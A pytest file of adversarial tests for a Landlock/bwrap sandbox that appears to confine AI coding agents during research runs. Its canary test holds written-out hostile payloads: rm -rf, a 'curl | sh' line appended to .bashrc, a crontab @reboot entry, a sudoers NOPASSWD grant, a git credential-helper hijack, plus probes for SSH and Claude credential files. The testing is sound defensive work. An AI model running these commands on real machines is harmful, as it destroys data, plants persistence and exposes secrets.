"""Adversarial tests of the collection sandbox (design 04 §5, audit).

Every test runs the exact wrapping of a real collection run (runner.harness_argv:
systemd scope limits -> bwrap -> Landlock) around a hostile script, then checks
the host. Destructive steps only ever target canaries this test creates; the
containment proofs (home, PID namespace, no_new_privs) are asserted first so a
broken sandbox fails before any destructive step could reach the host.
"""

from __future__ import annotations

import hashlib
import http.client
import json
import os
import shutil
import socket
import sqlite3
import struct
import subprocess
import threading
import time
import uuid
from collections.abc import Iterator
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any

import pytest

from rootsh.analysis.events import Agent
from rootsh.research.collect import keyproxy, runner
from rootsh.research.collect.confine import abi_version
from rootsh.research.collect.runner import (
    LIMITS,
    CollectionStopError,
    Host,
    PlannedRun,
    harness_argv,
    home_files,
    read_record,
)
from rootsh.research.collect.scenario import parse_repository
from rootsh.research.collect.verify import verify
from rootsh.storage.db import DatabaseKind, open_database
from rootsh.storage.migrations import migrate
from rootsh.storage.schema import MIGRATIONS
from support import FIXTURES_DIR

_missing = [t for t in ("bwrap", "systemd-run", "prlimit") if shutil.which(t) is None]
pytestmark = pytest.mark.skipif(bool(_missing), reason=f"missing {_missing}")

HOST = Host.detect(None)
SANDBOX_PATH = "/usr/bin"


def sandboxed(tmp_path: Path, script: str, timeout: float = 60) -> subprocess.CompletedProcess[str]:
    dirs = [tmp_path / n for n in ("ws", "rec", "home")]
    for d in dirs:
        d.mkdir(exist_ok=True)
    ws, rec, home = dirs
    argv = harness_argv(HOST, ws, rec, home, ["sh", "-c", script], {"PATH": SANDBOX_PATH})
    return subprocess.run(argv, capture_output=True, text=True, timeout=timeout, check=False)  # noqa: S603


def ok(done: subprocess.CompletedProcess[str]) -> str:
    assert done.returncode == 0, f"exit {done.returncode}\n{done.stdout}\n{done.stderr}"
    return done.stdout


# --- the wrapping itself ----------------------------------------------------------------


def test_landlock_abi_supports_scoping() -> None:
    assert abi_version() >= 6


def test_scope_applies_memory_task_and_file_size_limits() -> None:
    script = (
        'c=/sys/fs/cgroup$(cut -d: -f3 /proc/self/cgroup); cat "$c/memory.max" "$c/pids.max"; '
        "ulimit -f"
    )
    out = subprocess.run(  # noqa: S603
        [*LIMITS, "sh", "-c", script], capture_output=True, text=True, check=True, timeout=30
    ).stdout.split()
    assert out == [str(1536 * 1024**2), "512", str(512 * 1024**2 // 512)]


# --- containment proofs (non-destructive) -------------------------------------------------


def test_identity_and_privileges(tmp_path: Path) -> None:
    out = ok(
        sandboxed(
            tmp_path,
            "grep NoNewPrivs /proc/self/status; echo pid=$$; "
            "sudo -n true 2>/dev/null && echo SUDO-WORKED; "
            "ls /proc | grep -c '^[0-9]'",
        )
    )
    assert "NoNewPrivs:\t1" in out
    assert "SUDO-WORKED" not in out
    # PID namespace: the sandbox sees only its own handful of processes.
    assert int(out.split()[-1]) < 10


def test_host_secrets_and_sessions_are_not_visible(tmp_path: Path) -> None:
    uid = os.getuid()
    probes = [
        Path.home() / ".ssh",
        Path.home() / ".claude" / ".credentials.json",
        Path.home() / ".claude" / "settings.json",
        Path.home() / ".config" / "opencode",
        Path.home() / ".gitconfig",
        Path.home() / ".bash_history",
        Path(f"/run/user/{uid}"),
        Path("/tmp/.X11-unix"),  # noqa: S108 - probing the host's X11 socket dir
        Path("/var/run/docker.sock"),
    ]
    script = "; ".join(f"test -e '{p}' && echo VISIBLE:{p}" for p in probes) + "; true"
    assert "VISIBLE" not in ok(sandboxed(tmp_path, script))


def test_writes_outside_the_workspace_fail(tmp_path: Path) -> None:
    repo_src = Path(__file__).resolve().parents[3] / "src"
    targets = ["/usr/rootsh-x", "/etc/rootsh-x", str(repo_src / "rootsh-x")]
    targets += [str(p / "rootsh-x") for p in HOST.read_only if p.is_dir()]
    script = "; ".join(f"touch '{t}' 2>/dev/null && echo WROTE:{t}" for t in targets) + "; true"
    assert "WROTE" not in ok(sandboxed(tmp_path, script))
    for target in targets:
        assert not Path(target).exists()


@pytest.fixture
def host_listener() -> Iterator[int]:
    server = socket.socket()
    server.bind(("127.0.0.1", 0))
    server.listen()
    yield server.getsockname()[1]
    server.close()


@pytest.fixture
def host_abstract_socket() -> Iterator[str]:
    name = f"rootsh-test-{uuid.uuid4().hex}"
    server = socket.socket(socket.AF_UNIX)
    server.bind("\0" + name)
    server.listen()
    yield name
    server.close()


NET_PROBE = """
import socket, sys
def attempt(f):
    try: f(); return "OPEN"
    except OSError as e: return f"errno={e.errno}"
port, name = int(sys.argv[1]), sys.argv[2]
print("localhost", attempt(lambda: socket.create_connection(("127.0.0.1", port), 3)))
print("abstract", attempt(lambda: socket.socket(socket.AF_UNIX).connect("\\0" + name)))
def listen():
    s = socket.socket(); s.bind(("0.0.0.0", 0)); s.listen()
print("listen", attempt(listen))
print("https-port", attempt(lambda: socket.create_connection(("127.0.0.1", 443), 3)))
"""


def test_network_reaches_only_port_443(
    tmp_path: Path, host_listener: int, host_abstract_socket: str
) -> None:
    (tmp_path / "ws").mkdir()
    (tmp_path / "ws" / "probe.py").write_text(NET_PROBE)
    out = ok(sandboxed(tmp_path, f"python3 probe.py {host_listener} {host_abstract_socket}"))
    lines = dict(line.split(" ", 1) for line in out.splitlines())
    assert lines["localhost"] == "errno=13"  # EACCES: Landlock, not a closed port
    assert lines["abstract"] == "errno=1"  # EPERM: Landlock scope
    assert lines["listen"] == "errno=13"
    # Port 443 is allowed: nothing listens on localhost:443, so the kernel
    # answers ECONNREFUSED (111), not Landlock's EACCES.
    assert lines["https-port"] == "errno=111"


def _host_has(marker: str) -> bool:
    found = subprocess.run(["pgrep", "-f", marker], capture_output=True, check=False)  # noqa: S603,S607
    return found.returncode == 0


def test_no_process_survives_the_run(tmp_path: Path) -> None:
    marker = f"rootsh-orphan-{uuid.uuid4().hex}"
    out = ok(
        sandboxed(
            tmp_path,
            f"setsid bash -c 'exec -a {marker} sleep 300' >/dev/null 2>&1 & "
            f"sleep 0.5; pgrep -f {marker} >/dev/null && echo STARTED",
        )
    )
    assert "STARTED" in out  # the orphan really existed inside the sandbox
    assert not _host_has(marker), "a daemonized process outlived the sandbox"


def test_timeout_kill_leaves_no_process(tmp_path: Path) -> None:
    marker = f"rootsh-hang-{uuid.uuid4().hex}"
    with pytest.raises(subprocess.TimeoutExpired):
        sandboxed(tmp_path, f"bash -c 'exec -a {marker} sleep 300'", timeout=3)
    assert not _host_has(marker)


def test_signals_cannot_reach_host_processes(tmp_path: Path) -> None:
    victim = subprocess.Popen(["sleep", "60"])  # noqa: S607
    try:
        out = ok(sandboxed(tmp_path, f"kill -9 {victim.pid} 2>/dev/null && echo KILLED; true"))
        assert "KILLED" not in out
        assert victim.poll() is None
    finally:
        victim.kill()
        victim.wait()


# --- destructive payloads, against canaries only -----------------------------------------


@pytest.fixture
def home_canary() -> Iterator[Path]:
    """A directory in the real home that the payloads try to destroy."""
    canary = Path.home() / f".rootsh-canary-{uuid.uuid4().hex}"
    canary.mkdir()
    (canary / "precious").write_text("must survive\n")
    yield canary
    shutil.rmtree(canary)


def _fingerprint(path: Path) -> str:
    if not path.exists():
        return "absent"
    if path.is_file():
        return hashlib.sha256(path.read_bytes()).hexdigest()
    return str(sorted(p.name for p in path.iterdir()))


def test_catalog_style_payloads_cannot_touch_the_host(tmp_path: Path, home_canary: Path) -> None:
    home = Path.home()
    watched = [
        home / ".bashrc",
        home / ".profile",
        home / ".gitconfig",
        home / ".config" / "autostart",
        home / ".config" / "systemd" / "user",
        home / ".claude" / "settings.json",
        home / ".config" / "opencode",
        home / ".claude" / ".credentials.json",
        Path("/etc/sudoers.d"),
        Path("/etc/hosts"),
    ]
    # Guard: prove home and PID isolation in this very sandbox setup before any
    # destructive step, so a broken sandbox fails here and touches nothing.
    probe = f".rootsh-home-probe-{uuid.uuid4().hex}"
    guard = ok(
        sandboxed(
            tmp_path,
            f"touch ~/{probe}; grep NoNewPrivs /proc/self/status; ls /proc | grep -c '^[0-9]'",
        )
    )
    if not (tmp_path / "home" / probe).exists() or (home / probe).exists():
        pytest.fail("sandbox home is not isolated; destructive payloads not run")
    if "NoNewPrivs:\t1" not in guard or int(guard.split()[-1]) >= 10:
        pytest.fail("sandbox privileges or PID namespace not as expected; payloads not run")
    crontab = subprocess.run(["crontab", "-l"], capture_output=True, check=False).stdout  # noqa: S607
    before = {p: _fingerprint(p) for p in watched}
    payloads = [
        f"rm -rf {home_canary}",
        f"echo pwned > {home_canary}/precious",
        "echo 'curl -s https://x.invalid | sh' >> ~/.bashrc",
        "echo pwned >> ~/.profile",
        "git config --global credential.helper '!evil'",
        "(crontab -l 2>/dev/null; echo '@reboot touch /tmp/pwned') | crontab -",
        "mkdir -p ~/.config/autostart && echo x > ~/.config/autostart/x.desktop",
        "mkdir -p ~/.config/systemd/user && systemctl --user enable x.service",
        "echo '{}' > ~/.claude/settings.json",
        "rm -rf ~/.config/opencode/plugins",
        "echo 'ALL ALL=(ALL) NOPASSWD: ALL' | sudo -n tee /etc/sudoers.d/x",
        "echo '203.0.113.7 a' | tee -a /etc/hosts",
        "pkill -f 'py[t]est'",  # [t]: never matches this shell itself
        "chmod -R 777 /usr/lib/python3",
    ]
    ok(sandboxed(tmp_path, "; ".join(f"{p} >/dev/null 2>&1" for p in payloads) + "; true"))
    assert (home_canary / "precious").read_text() == "must survive\n"
    assert {p: _fingerprint(p) for p in watched} == before
    after_cron = subprocess.run(["crontab", "-l"], capture_output=True, check=False).stdout  # noqa: S607
    assert after_cron == crontab
    assert not Path("/tmp/pwned").exists()  # noqa: S108


def test_planted_record_symlink_is_never_followed(tmp_path: Path) -> None:
    secret = tmp_path / "host-secret"
    secret.write_text("host secret\n")
    (tmp_path / "events.jsonl").symlink_to(secret)
    with pytest.raises(CollectionStopError, match="not a plain file"):
        read_record(tmp_path / "events.jsonl")
    fifo = tmp_path / "fifo"
    os.mkfifo(fifo)
    with pytest.raises(CollectionStopError, match="not a regular file"):
        read_record(fifo)
    assert read_record(tmp_path / "missing") == b""


def test_home_files_lists_agent_leftovers_only(tmp_path: Path) -> None:
    home_dir = tmp_path / "home"
    ok(
        sandboxed(
            tmp_path,
            "echo alias >> ~/.bashrc; mkdir -p ~/.claude/projects ~/.local/share/opencode; "
            "echo s > ~/.claude/projects/t; echo d > ~/.local/share/opencode/db",
        )
    )
    assert [path for path, _ in home_files(home_dir, HOST)] == [".bashrc"]


# --- collect() end to end with a stub agent in the real sandbox ---------------------------


def _stub_collect(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, script: str
) -> tuple[sqlite3.Connection, Path, PlannedRun]:
    def stub(*_args: Any) -> Any:
        return ["sh", "-c", script], {"PATH": SANDBOX_PATH}

    monkeypatch.setattr(runner, "agent_command", stub)
    fake = {"claudeAiOauth": {"accessToken": "fake", "expiresAt": 4_102_444_800_000}}
    monkeypatch.setattr(runner, "read_credential", lambda _host: json.dumps(fake).encode())
    conn = open_database(tmp_path / "research.db", DatabaseKind.RESEARCH)
    migrate(conn, MIGRATIONS[DatabaseKind.RESEARCH])
    (scenario,) = parse_repository(
        {
            "repository": {"name": "r", "git": True, "files": {"a.txt": "a\n"}},
            "scenario": [
                {"id": "r-x", "intent": "benign", "vector": "none", "aim": "none", "prompt": "p"}
            ],
        },
        "t",
    )
    return conn, tmp_path / "data", PlannedRun(scenario, Agent.CLAUDE_CODE, 1)


def _prompt_line() -> str:
    payload = json.loads((FIXTURES_DIR / "hook_payloads.json").read_text())["claude_code"]
    line = {"hook": "UserPromptSubmit", "at": "2026-11-19T10:00:00+00:00"}
    return json.dumps(line | {"payload": payload["UserPromptSubmit"]})


def test_collect_stores_a_normal_run(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    script = (
        f"printf '%s\\n' '{_prompt_line()}' > /rec/events.jsonl; "
        "echo b > /work/b.txt; echo x >> ~/.bashrc"
    )
    conn, data, run = _stub_collect(tmp_path, monkeypatch, script)
    summary = runner.collect(run, HOST, data, conn, "stub")
    assert "1 events" in summary
    row = conn.execute(
        "SELECT recorder_loaded, hook_errors, workspace_sha256 != final_sha256, home_files_json "
        "FROM trace_runs"
    ).fetchone()
    assert row[:3] == (1, 0, 1)
    assert [p for p, _ in json.loads(row[3])] == [".bashrc"]
    assert not (data / "work" / run.trace_id).exists()
    assert verify(conn, [run.scenario], data, HOST.who) == []


@pytest.mark.parametrize(
    ("script", "message"),
    [
        ("ln -s {secret} /rec/events.jsonl", "not a plain file"),
        (
            "ln -s {secret} /rec/hook-errors.log; printf '%s\\n' '{prompt}' > /rec/events.jsonl",
            "not a plain file",
        ),
        ("true", "recorder did not load"),
        (
            "printf '%s\\n' '{prompt}' > /rec/events.jsonl; echo crash > /rec/hook-errors.log",
            "crash",
        ),
        ("mkfifo /rec/events.jsonl", "not a regular file"),
    ],
)
def test_collect_refuses_tampered_or_broken_runs(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, script: str, message: str
) -> None:
    secret = tmp_path / "host-secret"
    secret.write_text("HOST-SECRET-VALUE\n")
    hostile = script.format(secret=secret, prompt=_prompt_line())
    conn, data, run = _stub_collect(tmp_path, monkeypatch, hostile)
    with pytest.raises(CollectionStopError, match=message):
        runner.collect(run, HOST, data, conn, "stub")
    assert conn.execute("SELECT count(*) FROM traces").fetchone() == (0,)
    for path in data.rglob("*"):
        if path.is_file() and not path.is_symlink():
            assert b"HOST-SECRET-VALUE" not in path.read_bytes(), path


# --- the NVIDIA key proxy ------------------------------------------------------------------

FAKE_KEY = "nvapi-ROOTSH-TEST-KEY-not-real"


@pytest.fixture
def fake_upstream() -> Iterator[tuple[int, list[tuple[str, str | None]]]]:
    seen: list[tuple[str, str | None]] = []

    class Upstream(BaseHTTPRequestHandler):
        def do_POST(self) -> None:
            self.rfile.read(int(self.headers.get("Content-Length") or 0))
            seen.append((self.path, self.headers.get("Authorization")))
            body = b'data: {"ok": 1}\n\n'
            self.send_response(200)
            self.send_header("Content-Type", "text/event-stream")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, format: str, *args: object) -> None:
            """Quiet."""

    server = ThreadingHTTPServer(("127.0.0.1", 0), Upstream)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    yield int(server.server_address[1]), seen
    server.shutdown()
    server.server_close()


@pytest.fixture
def proxy(fake_upstream: tuple[int, list[Any]]) -> Iterator[keyproxy.KeyProxy]:
    port = fake_upstream[0]
    running = keyproxy.start(FAKE_KEY, lambda: http.client.HTTPConnection("127.0.0.1", port))
    yield running
    running.stop()


def _call(proxy: keyproxy.KeyProxy, path: str, token: str) -> tuple[int, bytes]:
    conn = http.client.HTTPConnection("127.0.0.1", proxy.port, timeout=10)
    conn.request("POST", path, body=b"{}", headers={"Authorization": f"Bearer {token}"})
    response = conn.getresponse()
    return response.status, response.read()


def test_proxy_injects_the_key_only_for_the_token_and_allowed_paths(
    proxy: keyproxy.KeyProxy, fake_upstream: tuple[int, list[tuple[str, str | None]]]
) -> None:
    _, seen = fake_upstream
    assert _call(proxy, "/v1/chat/completions", proxy.access_token) == (200, b'data: {"ok": 1}\n\n')
    assert seen == [("/v1/chat/completions", f"Bearer {FAKE_KEY}")]
    assert _call(proxy, "/v1/chat/completions", "wrong")[0] == 401
    assert _call(proxy, "/v1/../admin", proxy.access_token)[0] == 403
    assert _call(proxy, "/v2/anything", proxy.access_token)[0] == 403
    assert len(seen) == 1  # refused requests never reach the upstream
    assert (proxy.stats.forwarded, proxy.stats.refused) == (1, 3)


def test_proxy_counts_a_client_reset_without_a_traceback(
    proxy: keyproxy.KeyProxy, capsys: pytest.CaptureFixture[str]
) -> None:
    # A half-sent request line, then an RST (linger 0): the handler's readline
    # raises ConnectionResetError, as seen 4 times in the real collection log.
    with socket.create_connection(("127.0.0.1", proxy.port), timeout=10) as sock:
        sock.sendall(b"POST /v1/chat")
        time.sleep(0.2)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0))
    deadline = time.monotonic() + 10
    while proxy.stats.dropped == 0 and time.monotonic() < deadline:
        time.sleep(0.05)
    assert (proxy.stats.dropped, proxy.stats.forwarded, proxy.stats.refused) == (1, 0, 0)
    assert "Traceback" not in capsys.readouterr().err


def test_sandbox_reaches_the_proxy_only_when_granted_and_never_sees_the_key(
    tmp_path: Path, proxy: keyproxy.KeyProxy, monkeypatch: pytest.MonkeyPatch
) -> None:
    # The key is in the collector's own environment, as in a real collection.
    monkeypatch.setenv("NVIDIA_API_KEY", FAKE_KEY)
    call = (
        f"curl -s -o /dev/null -w '%{{http_code}}' -X POST "
        f"-H 'Authorization: Bearer {proxy.access_token}' "
        f"http://127.0.0.1:{proxy.port}/v1/chat/completions; echo; "
        "env; cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n'"
    )
    ws, rec, home = (tmp_path / n for n in ("ws", "rec", "home"))
    for d in (ws, rec, home):
        d.mkdir()
    env = {"PATH": SANDBOX_PATH}
    for grant, expected in (((), "000"), ((proxy.port,), "200")):
        argv = harness_argv(HOST, ws, rec, home, ["sh", "-c", call], env, None, grant)
        out = subprocess.run(  # noqa: S603
            argv, capture_output=True, text=True, timeout=60, check=False
        ).stdout
        assert out.splitlines()[0] == expected  # 000: Landlock refused the connect
        assert FAKE_KEY not in out
    assert not any(
        FAKE_KEY in p.read_text(errors="ignore") for p in tmp_path.rglob("*") if p.is_file()
    )
